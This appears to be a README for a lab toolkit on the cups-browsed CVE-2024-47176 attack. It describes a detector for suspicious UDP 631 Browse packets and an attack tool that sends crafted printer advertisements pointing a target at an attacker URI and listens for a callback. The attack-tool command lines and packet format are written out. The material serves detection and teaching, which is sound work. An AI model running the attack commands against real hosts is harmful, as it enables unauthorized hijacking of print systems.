# CUPS Browse Detection & Attack Tools
 
Tools for demonstrating and detecting the `cups-browsed` printer-advertisement attack (CVE-2024-47176). It contains a **detector** that monitors for suspicious CUPS Browse traffic and an **attacker** that crafts the malicious discovery packets.

## Files
- cups_attack.py    - attack tool
- cups_detector.py  - detection tool
- cups_logging.py   - shared logging setup

## How it works
 
`cups-browsed` listens on **UDP port 631** and accepts unauthenticated "Browse" packets that advertise a printer. A crafted packet can point the victim's print system at an attacker-controlled URI. The detector watches for these packets and suspicious traffic.
 
### Browse string
 
Both tools use a simplified Browse string:
 
```
<type> <state> <uri>\n
```
 
e.g. `0 3 http://172.18.0.1:9100/printers/Printer`
 
## Detector
 
```bash
# Live monitoring on an interface
sudo python3 cups_detector.py -i "interfacename"
 
# Offline analysis of a capture
python3 cups_detector.py -r pcap_files/attack.pcap
```
 
### Alert types
 
| Type | Trigger |
|------|---------|
| `UNAUTHORIZED` | A Browse packet from a source IP not in the allowlist |
| `MALFORMED` | A port-631 payload that doesn't parse as a Browse string |
| `REPEATED` | More than `--threshold` packets from one source within `--window` seconds |
| `IPP CONNECTION` | TCP SYN toward a public address (possible callback) |
 
### Options
 
| Flag | Default | Description |
|------|---------|-------------|
| `-i, --iface` | - | Interface for live monitoring. |
| `-r, --pcap` | - | Read packets from a pcap file (offline). |
| `--allowlist` | - | One or more allowed printer source IPs. |
| `-o, --out` | timestamped | Output file for alerts (JSON). |
| `--log` | - | File to also write logs to. |
| `--window` | `10` | Seconds for the repeated-discovery window. |
| `--threshold` | `5` | Max packets per window before `REPEATED` fires. |
 
Provide either `--iface` (live) or `--pcap` (offline). Alerts are written as JSON to `evidence/alerts_<timestamp>.json` unless you set `-o`.
 
## Attack tool
 
```bash
# Minimal:
sudo python3 cups_attack.py -t 172.18.0.2 -a 172.18.0.1
 
# Full: listen for callback and capture to pcap
sudo python3 cups_attack.py -t 172.18.0.2 -a 172.18.0.1 -p 9100 \
    --ptype 0 --pstate 3 --pname Printer -c 1 \
    --listen --pcap pcap_files/attack.pcap --iface "interfacename" \
    --timeout 3 --log evidence/attack.log
```
 
### Options
 
| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address. |
| `-a, --atk-ip` | **required** | Attacker IP advertised in the Browse URI. |
| `-p, --atk-port` | `9100` | Attacker port in the URI / callback listener. |
| `--ptype` | `0` | Printer type field. |
| `--pstate` | `3` | Printer state field. |
| `--pname` | `Printer` | Printer name in the URI. |
| `-c, --count` | `1` | Number of packets to send. |
| `--listen` | off | Listen for a TCP callback on `--atk-port`. |
| `--pcap` | - | Save captured packets to this pcap (requires `--iface`). |
| `--iface` | - | Interface for packet capture. |
| `--timeout` | `3` | Seconds to wait for capture/callback. |
| `--log` | - | File to also write logs to. |
 
## Typical lab workflow
 
1. Start the detector on the bridge interface:
```bash
   sudo python3 cups_detector.py -i "interfacename" --allowlist 172.18.0.1
```
2. From the attacker host, send a crafted advertisement and capture it:
```bash
   sudo python3 cups_attack.py -t 172.18.0.2 -a 172.18.0.1 \
       --listen --pcap pcap_files/attack.pcap --iface "interfacename"
```
3. Stop the detector with `Ctrl-C`; it exports alerts to `evidence/`.

 
## Output
 
- **Alerts:** JSON array under `evidence/`, each entry with `time`, `type`, `source`, and `detail`.
- **Logs:** streamed to the console, and to a file when `--log` is set.

